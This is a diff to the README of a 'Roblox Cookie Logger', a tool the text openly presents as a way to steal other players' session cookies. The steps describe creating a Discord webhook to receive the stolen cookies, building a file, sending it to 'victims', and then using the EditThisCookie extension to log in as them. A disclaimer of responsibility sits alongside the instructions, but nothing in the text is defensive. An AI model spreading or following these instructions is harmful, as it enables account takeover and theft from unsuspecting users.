@@ -4,8 +4,8 @@ ROBLOX COOKIE LOGGER
 Im not responsible how other people will use this program, 1. Download 
 2. Open and Extract 
 3. Make Discord WebHook so the bot/webhook would send the Cookies of other people/victims, Copy the WebHook id. 
-4. Launch the Program and put in the "WebHook" box the Discord WebHook u copied.
-5. After u want to send that to other people and if they download and go in the Cookie Logger You would get The person's Roblox Cookie.
+4. Launch the Program and put in the "WebHook" box the Discord WebHook u copied and build a file.
+5. After u want to send that file to other people and if they download and go in the Cookie Logger You would get The person's Roblox Cookie.
 
 And u will need to have EditThisCookie Extension so u can log in with that person's cookie.
 
